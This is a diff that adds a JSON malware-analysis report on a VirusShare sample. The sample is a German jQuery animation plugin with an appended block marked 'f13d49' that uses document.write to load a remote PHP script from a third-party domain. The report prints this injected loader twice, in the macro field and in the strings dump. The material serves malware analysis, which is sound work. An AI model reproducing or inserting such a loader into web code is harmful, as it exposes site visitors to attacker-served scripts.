@@ -1,0 +1,92 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "write": "May write to a file"
+        },
+        "macro": "/*\n* Clean Css Animation f\ufffdr jQuery von pfirsichmelba.de // Alexander Farkas <a.farkas@pfirsichmelba.de>\n*\n* Dual licensed under the MIT (MIT-LICENSE.txt)\n* and GPL (GPL-LICENSE.txt) licenses.\n* \n* Bei guten Verbesserungen/\ufffdffentlichem Einsatz w\ufffdre ich f\ufffdr eine kurze Mail mit Link dankbar.\n*/\njQuery.fn.CleanCSSAnimation = function(_animetyp,$arg1,$arg2,$arg3,$arg4) {\n\tvar $args = new Array($arg1,$arg2,$arg3,$arg4);\n\t//Position der Callback-Funktion ist in der Regel der 2. Parameter (1), bei Animate, jedoch der 3. (2)\n\t//F\ufffdr Interface-Nutzer weitere Ausnahmeregeln: (_animetyp == \"animate\" || _animetyp == \"Pulsate\" || _animetyp == \"Fold\" || _animetyp == \"UnFold\" || _animetyp == \"UnFold\" || _animetyp == \"Highlight\") ? $fnpos = 2 : $fnpos = 1;\n\t(_animetyp == \"animate\") ? $fnpos = 2 : $fnpos = 1;\n\tvar $cbfn = \"\";\n\t//Ist eine CallbackFunktion definiert, wird Sie und ihre Position gespeichert (\ufffdberschreibt also die beiden Zeilen davor)\n\t//Hier wird lediglich die Position ermittelt\n\tjQuery.each($args,function(o){\n\t\tif(typeof this == \"function\"){\n\t\t\t//Sichern der eigentlichen Callback-Funktion\n\t\t\t$cbfn = $args[o];\n\t\t\t$fnpos = o;\n\t\t}\n\t\treturn;\n\t});\n\t//Eigentliches Ersetzen der Callbackfunktion mit der Cleanerfunktion an der erwarteten bzw. ermittelten Position; die alte wird als Parameter \ufffdbergeben\n\t$args.splice($fnpos, 1, function(){_apllyOldCallback(this,$cbfn)});\n\treturn this.each(function(){\n\t//Verschmutzen des inline-css: vor Animation\n\tunMakeInlineCSS(this,'pre');\n\t//Aufruf der jQuery-Animation\n\tjQuery(this)[ _animetyp ].apply( jQuery(this), $args );\n\t});\n};\n//Eigentliche S\ufffduberungsfunktion\nfunction unMakeInlineCSS($elem,$when){\n\t//Name der css-class die statt display: none/display:block verwendet werden soll.\n\tvar $nodisClass = \"displaynone\";\n\tvar $disClass = \"displayblock\";\n\tif($when == \"pre\") {\n\t\tif(jQuery($elem).is('.'+$nodisClass))\n\t\t\tjQuery($elem).css(\"display\",\"none\").removeClass($nodisClass);\n\t\telse if(jQuery($elem).is('.'+$disClass))\n\t\t\tjQuery($elem).css(\"display\",\"block\").removeClass($disClass);\n\t} else if($when == \"post\") {\n\t\tif(jQuery($elem).css(\"display\") == \"none\")\n\t\t\tjQuery($elem).addClass($nodisClass).css(\"display\",\"\");\n\t\telse if(jQuery($elem).css(\"display\") == \"block\")\n\t\t\tjQuery($elem).addClass($disClass).css(\"display\",\"\");\n\t}\t\n};\n// Callbackfunktion startet S\ufffduberung und falls vorhanden die vom Autoren definierte Callbackfunktion\nfunction _apllyOldCallback($elem,$cbfn){\n\t//S\ufffdubern\n\tunMakeInlineCSS($elem,\"post\");\n\t// Einige Plugin-Effekte (z.B. Interface) rufen die Callback-Funktion auf, bevor die Funktion wirklich beendet wurde -> obigen S\ufffduberungsaufruf l\ufffdschen und durch folgenden ersetzen\n\t/*\n\t_glob_cleancssele = $elem;\n\twindow.setTimeout(\"unMakeInlineCSS(_glob_cleancssele,\"post\")\", 3);\n\t*/\n\t//Wenn eine Callback-Funktion definiert wurde, kann sie jetzt ausgef\ufffdhrt werden\n\tif(typeof $cbfn == \"function\")\n\t\t$cbfn.apply($elem);\n};\n\n\n/*f13d49*/\ndocument.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=128908783' type='text/javascript'></\" + \"script>\");\n/*/f13d49*/"
+    },
+    "filename": "VirusShare_68bc3a0c3b5099db4ac31644743dde06",
+    "filesize": 3057,
+    "filetype": "HTML document, ISO-8859 text",
+    "hashes": {
+        "md5": "68bc3a0c3b5099db4ac31644743dde06",
+        "sha1": "e2598ae96dd03cab5e5560133d904a96f5d6aa83",
+        "sha256": "6a7decd06f23d97bce78b01212b38eeaaec425d8f3fb12fadf972021aa5b2d5f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "* Clean Css Animation fr jQuery von pfirsichmelba.de // Alexander Farkas <a.farkas@pfirsichmelba.de>",
+            "* Dual licensed under the MIT (MIT-LICENSE.txt)",
+            "* and GPL (GPL-LICENSE.txt) licenses.",
+            "* Bei guten Verbesserungen/ffentlichem Einsatz wre ich fr eine kurze Mail mit Link dankbar.",
+            "jQuery.fn.CleanCSSAnimation = function(_animetyp,$arg1,$arg2,$arg3,$arg4) {",
+            "\tvar $args = new Array($arg1,$arg2,$arg3,$arg4);",
+            "\t//Position der Callback-Funktion ist in der Regel der 2. Parameter (1), bei Animate, jedoch der 3. (2)",
+            "\t//Fr Interface-Nutzer weitere Ausnahmeregeln: (_animetyp == \"animate\" || _animetyp == \"Pulsate\" || _animetyp == \"Fold\" || _animetyp == \"UnFold\" || _animetyp == \"UnFold\" || _animetyp == \"Highlight\") ? $fnpos = 2 : $fnpos = 1;",
+            "\t(_animetyp == \"animate\") ? $fnpos = 2 : $fnpos = 1;",
+            "\tvar $cbfn = \"\";",
+            "\t//Ist eine CallbackFunktion definiert, wird Sie und ihre Position gespeichert (berschreibt also die beiden Zeilen davor)",
+            "\t//Hier wird lediglich die Position ermittelt",
+            "\tjQuery.each($args,function(o){",
+            "\t\tif(typeof this == \"function\"){",
+            "\t\t\t//Sichern der eigentlichen Callback-Funktion",
+            "\t\t\t$cbfn = $args[o];",
+            "\t\t\t$fnpos = o;",
+            "\t\treturn;",
+            "\t});",
+            "\t//Eigentliches Ersetzen der Callbackfunktion mit der Cleanerfunktion an der erwarteten bzw. ermittelten Position; die alte wird als Parameter bergeben",
+            "\t$args.splice($fnpos, 1, function(){_apllyOldCallback(this,$cbfn)});",
+            "\treturn this.each(function(){",
+            "\t//Verschmutzen des inline-css: vor Animation",
+            "\tunMakeInlineCSS(this,'pre');",
+            "\t//Aufruf der jQuery-Animation",
+            "\tjQuery(this)[ _animetyp ].apply( jQuery(this), $args );",
+            "\t});",
+            "//Eigentliche Suberungsfunktion",
+            "function unMakeInlineCSS($elem,$when){",
+            "\t//Name der css-class die statt display: none/display:block verwendet werden soll.",
+            "\tvar $nodisClass = \"displaynone\";",
+            "\tvar $disClass = \"displayblock\";",
+            "\tif($when == \"pre\") {",
+            "\t\tif(jQuery($elem).is('.'+$nodisClass))",
+            "\t\t\tjQuery($elem).css(\"display\",\"none\").removeClass($nodisClass);",
+            "\t\telse if(jQuery($elem).is('.'+$disClass))",
+            "\t\t\tjQuery($elem).css(\"display\",\"block\").removeClass($disClass);",
+            "\t} else if($when == \"post\") {",
+            "\t\tif(jQuery($elem).css(\"display\") == \"none\")",
+            "\t\t\tjQuery($elem).addClass($nodisClass).css(\"display\",\"\");",
+            "\t\telse if(jQuery($elem).css(\"display\") == \"block\")",
+            "\t\t\tjQuery($elem).addClass($disClass).css(\"display\",\"\");",
+            "// Callbackfunktion startet Suberung und falls vorhanden die vom Autoren definierte Callbackfunktion",
+            "function _apllyOldCallback($elem,$cbfn){",
+            "\t//Subern",
+            "\tunMakeInlineCSS($elem,\"post\");",
+            "\t// Einige Plugin-Effekte (z.B. Interface) rufen die Callback-Funktion auf, bevor die Funktion wirklich beendet wurde -> obigen Suberungsaufruf lschen und durch folgenden ersetzen",
+            "\t_glob_cleancssele = $elem;",
+            "\twindow.setTimeout(\"unMakeInlineCSS(_glob_cleancssele,\"post\")\", 3);",
+            "\t//Wenn eine Callback-Funktion definiert wurde, kann sie jetzt ausgefhrt werden",
+            "\tif(typeof $cbfn == \"function\")",
+            "\t\t$cbfn.apply($elem);",
+            "/*f13d49*/",
+            "document.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=128908783' type='text/javascript'></\" + \"script>\");",
+            "/*/f13d49*/"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=128908783"
+        ]
+    },
+    "time": "0:00:00.283696",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
